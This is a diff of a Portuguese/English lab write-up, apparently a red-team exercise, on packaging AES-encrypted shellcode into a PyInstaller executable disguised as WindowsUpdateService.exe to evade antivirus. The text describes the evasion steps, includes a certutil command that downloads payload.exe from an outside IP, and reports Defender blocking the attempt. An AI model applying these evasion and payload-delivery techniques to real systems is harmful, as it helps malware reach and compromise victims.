@@ -48,11 +48,13 @@ comando para converter o resultado em codigo hexadecimal
 ```xml  xxd -p result3.raw | tr -d '\n' | sed 's/\(..\)/\\x\1/g' > result03.txt ```
 
    (PRINT DA ENCRIPTACAO HEXADECIMAL)
+   ![Image](https://github.com/user-attachments/assets/4263f989-ef76-4d00-936e-32da016fc588)
 
   Logo apos eu usei este codigo python para converter a saida do comando anterior em uma versao encryptada usando uma chave AES de 16 bytes (128 bits),
   isso vai ajudar bypass o sistema de defesa do windows tornando mais dificil para o antivirus indentificar o codigo malicioso dentro do executavel 
 
 [PRINT DO VS CODE ENCRYPTACAO]
+![Image](https://github.com/user-attachments/assets/e32f7c99-fe4f-4b0e-ae34-aabd9e52e414)
 
 Agora nos temos um shellcode pronto para ser inserido no codigo 
 
@@ -70,7 +72,7 @@ Agora nos temos um shellcode pronto para ser inserido no codigo
  **NOTE:** Enquanto escrevia este artigo descobri que a opcao  ```VirtualAlloc + VirtualProtect``` pode ser mais eficiente em bypass o sistema de defesa, vou testar isso em artigos futuros 
 
  Esse foi o codigo adquirido na internet para descriptografar um shellcode usando AES-CBC, 
- alocar memória executável em uma heap privada no processo atual e executa o shellcode via CreateThread:
+ alocar memória executável em uma heap privada no processo atual e executar o shellcode via CreateThread o shellcode encryptografado esta na variavel encrypted_b64:
 
  ```Python
 import base64
@@ -131,6 +133,8 @@ Apos ter configurado o codigo foi usado este comando para gerar o executavel usa
 wine cmd
 pyinstaller --noconfirm --onefile malwareobfuscated.py
 ```
+![Image](https://github.com/user-attachments/assets/beb0f0eb-2ece-4e54-8f8e-7e046adbf5b3)
+
 
 Entretando nos adicionamos mais um degrau de obfuscacao editando o arquivo .spec, com o objetivo de parecer ao maximo um programa normal
 do windows. 
@@ -189,11 +193,13 @@ coll = COLLECT(
 )
 
 ```
+
+
 This build configuration utilizes the PyInstaller .spec file (resulted from the last command)  to generate a standalone Windows executable that mimics a legitimate system process.
 The output binary is named WindowsUpdateService.exe, leveraging process masquerading as an evasion technique. The executable is stripped of debug symbols, compressed using UPX, and runs silently without a console window, 
 reducing forensic visibility. No external dependencies are bundled, keeping the footprint minimal. 
 
-After configure the .spec file we generate the final executable:
+After configure the .spec file we generate the final executable from the .spec in a same folder of the code:
 
 ```bash
 wine cmd
@@ -201,6 +207,8 @@ pyinstaller malwareobfuscated.spec
 ```
 
 [ PRINT OF CREATED MALWARE]
+
+![Image](https://github.com/user-attachments/assets/7204a618-1173-485a-9aed-f3a4c04d3fba)
 
 
 
@@ -212,8 +220,11 @@ para realizar a requisicao vamos testar alguns executaveis nativos do windowns p
 [PRINT HYDRA]
 
  ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```
+ 
+ [PRINT CERTUTIL COMMAND]
+![Image](https://github.com/user-attachments/assets/30188fa6-c789-4413-b6bb-342a29d9f40c)
 
-[PRINT CERTUTIL COMMAND]
+
 
 Certutil.exe é uma Living-off-the-Land Binary (LOLBAS) usada por atacantes para baixar cargas maliciosas via HTTP, 
 mas também, como podemos ver pelo output muito monitorada por antivirus modernos. Infelizmente eu nao consegui ofuscar o antivirus p suficiente deste vez 
@@ -248,7 +259,8 @@ porem dois logs me chamaram a atencao:
 1. [Creation of Remote Treat]
  ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)
 
-3. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
+2. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
+![Image](https://github.com/user-attachments/assets/ea9fae2a-8fe5-4ef5-aea2-cf221346e740)
 
 
 
